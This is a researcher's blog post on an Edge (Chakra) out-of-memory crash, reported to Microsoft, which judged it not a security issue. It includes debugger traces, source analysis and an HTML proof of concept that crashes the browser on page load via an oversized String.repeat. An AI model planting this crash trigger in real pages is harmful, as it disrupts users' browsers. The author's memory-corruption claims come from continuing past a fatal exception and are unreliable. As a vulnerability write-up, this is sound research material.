---
layout: post
title:  "Microsoft Edge - Out-of-Memory Error Issue (MSRC Case 47790)"
date:   2019-01-02 10:05:03 +0800
tags:
    - OOM
---

Overview
--------
An out-of-memory error issue was found in Microsoft Edge resulting an unhandled exception in the browser. The issue was found using Domato fuzzer (modified). After minimizing the POC, it turns out that the issue can be trigger with a few lines of JavaScript. The issue has been reported to Microsoft (MSRC Case 47790) and they said:

**"Our engineer review the report and this isn't a security issue. Anything that lands on JavascriptError::ThrowOutOfMemoryError is not continuable and is not considered as a security issue, Edge just dies because it cant allocate memory. We can of course revisit if you can show a different behavior without throwing that OOM error."**

Thus, the issue is not really an security issue unless I can prove or someone can proven that the issue can be trigger without throwing an OOM. Further investigation, found the crash happened is by an exception that is explicitly raised by the application and in normal circumstances, there is no way to trick the browser to continue any code execution beyond the OOM (without debugger).

Initial Crash Information
-------------------------
Crash triage:
```
(1a00.224): Break instruction exception - code 80000003 (first chance)
KERNELBASE!wil::details::DebugBreak+0x2:
00007ff8`b61f6af2 cc int 3
```
It is found that the crash indeed not land to the access violation. If we continue execution, we can observe memory corrupted which leads to out-of-memory issue.
```
1:062> g
WARNING: Continuing a non-continuable exception
(1a00.224): Break instruction exception - code 80000003 (first chance)
chakra!Js::JavascriptError::ThrowOutOfMemoryError+0x13:
00007ff8`987318bf cc int 3
```
Continue executing in WinDBG, we can see a memory corruption happened here:
```
1:062> g
(1a00.224): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
msvcrt!memcpy+0x20:
00007ff8`b7812ee0 488b040a mov rax,qword ptr [rdx+rcx] ds:0053002b`002b003b=????????????????
```

Root Cause Analysis
-------------------
Observing the stack trace, we can see the stack executing in a sequence of:
```
1:064> k
# Child-SP RetAddr Call Site
00 000000dc`643fa858 00007ffb`69aabfb2 KERNELBASE!wil::details::DebugBreak+0x2
01 000000dc`643fa860 00007ffb`6999e033 chakra!ReportFatalException+0x26
02 000000dc`643fa8a0 00007ffb`69c13fd6 chakra!OutOfMemory_fatal_error+0x23
03 000000dc`643fa8e0 00007ffb`69991c70 chakra!Js::Exception::RaiseIfScriptActive+0x3a
04 000000dc`643fa910 00007ffb`698bc4a4 chakra!Js::Throw::OutOfMemory+0x10**
05 000000dc`643fa950 00007ffb`698bcf7f chakra!Memory::Recycler::LargeAlloc<0>+0x30
06 000000dc`643fa9a0 00007ffb`69bc4e93 chakra!Memory::Recycler::AllocLeaf+0x17f
07 000000dc`643faa10 00007ffb`69a09311 chakra!Js::JavascriptString::RepeatCore+0xb3
08 000000dc`643faac0 00007ffb`6998efb6 chakra!Js::JavascriptString::EntryRepeat+0x26f771
09 000000dc`643fab10 00007ffb`6986402b chakra!amd64_CallFunction+0x86
```
Examining the stack trace found the root-cause were coming from **JavascriptString::RepeatCore**. The issue found to fail sanitize the repeated string size (buffer). Since the Chakra core source is public, we can examine based on source code and our stack trace. 

Analysis of **JavascriptString::EntryRepeat** (only included the comment)
```
https://github.com/Microsoft/ChakraCore/blob/master/lib/Runtime/Library/JavascriptString.cpp#L2496

// get the input and perform processing
if (args.Info.Count > 1)
{
	if (!JavascriptOperators::IsUndefinedObject(args[1], scriptContext))
	{
		double countDbl = JavascriptConversion::ToInteger(args[1], scriptContext);
		if (JavascriptNumber::IsPosInf(countDbl) || countDbl < 0.0)
		{
      // it should throw this message however, our input manage to bypass this part
			JavascriptError::ThrowRangeError(scriptContext, JSERR_ArgumentOutOfRange, u("String.prototype.repeat")); 
		}
		count = NumberUtilities::LuFromDblNearest(countDbl);
	}
}

// get the length of the input
if (count == 0 || pThis->GetLength() == 0)
{
	return scriptContext->GetLibrary()->GetEmptyString();
}
else if (count == 1)
{
	return pThis; // this results from our length of buffer and store at pThis
}

// once all passes, it will return all the processing, length and input buffer to RepeatCore
return RepeatCore(pThis, count, scriptContext);
```

Analysis of **JavascriptString::RepeatCore**
```
https://github.com/Microsoft/ChakraCore/blob/master/lib/Runtime/Library/JavascriptString.cpp#L2538

... cut here ... 
const char16* currentRawString = currentString->GetString();
charcount_t currentLength = currentString->GetLength();
charcount_t finalBufferCount = UInt32Math::Add(UInt32Math::Mul(count, currentLength), 1);
char16* buffer = RecyclerNewArrayLeaf(scriptContext->GetRecycler(), char16, finalBufferCount);
if (currentLength == 1) // pass the current length, means pass our arguments here
{
	wmemset(buffer, currentRawString[0], finalBufferCount - 1);
	// passing our arguments here throwing the application to out-out-bound write, resulting overwriting into registers r12, r13 and r15.
	buffer[finalBufferCount - 1] = '\0'; 
}
``` 

To confirm our analysis, we can see value r14 is holding current length. We can observe the value in registers.
```
1:064> u chakra!Js::JavascriptString::RepeatCore+0xb3
chakra!Js::JavascriptString::RepeatCore+0xb3:
00007ffb`69bc4e93 488bd8 mov rbx,rax
00007ffb`69bc4e96 4183fe01 cmp r14d,1     // currentLength
```
Observing our registers and we got the result:
```
rax=000000dc643fa830 rbx=0000000000000000 rcx=000000dc643fa858
rdx=0052ff4e9beb57e3 rsi=0000000000000040 rdi=0053002b002b0033
rip=00007ffb88df2ee0 rsp=000000dc643fa830 rbp=000000dc643faa80
r8=0000000000000040 r9=0000000000000008 r10=0000000000000000
r11=000000dc643fa858 r12=0000000041414141 r13=0000000041414142
r14=0000000000000001 r15=0000000041414141
```

Continuing execution we can observe final land of the out-of-memory path:
```
1:064> k
# Child-SP RetAddr Call Site
00 000000dc`643fa830 00007ffb`69b40d7f msvcrt!memcpy+0x20
01 000000dc`643fa838 00000000`00000000 chakra!Js::JavascriptError::ThrowParserError+0x2f
1:064> r
rax=000000dc643fa830 rbx=0000000000000000 rcx=000000dc643fa858
rdx=0052ff4e9beb57e3 rsi=0000000000000040 rdi=0053002b002b0033
rip=00007ffb88df2ee0 rsp=000000dc643fa830 rbp=000000dc643faa80
r8=0000000000000040 r9=0000000000000008 r10=0000000000000000
r11=000000dc643fa858 r12=0000000041414141 r13=0000000041414142
r14=0000000000000001 r15=0000000041414141
iopl=0 nv up ei pl nz ac pe nc
cs=0033 ss=002b ds=002b es=002b fs=0053 gs=002b efl=00010212
msvcrt!memcpy+0x20:
00007ffb`88df2ee0 488b040a mov rax,qword ptr [rdx+rcx]ds:0053002b`002b003b=????????????????
```

**Proof-of-Concept**
```
<html>
<script>
function freememory() {
	try { CollectGarbage(); } catch(err) { }
	try { window.gc(); } catch(err) { }
}

function minimize_poc(){
	try{
		var var00015 = 'a'.repeat(0x41414141);
		eval(var00015);
	} catch(e){}
	
	freememory();
}
</script>
<body onload=minimize_poc()>
</body>
</html>
```

Sign off for now. Feel free to dispute, etc. Happy reading!
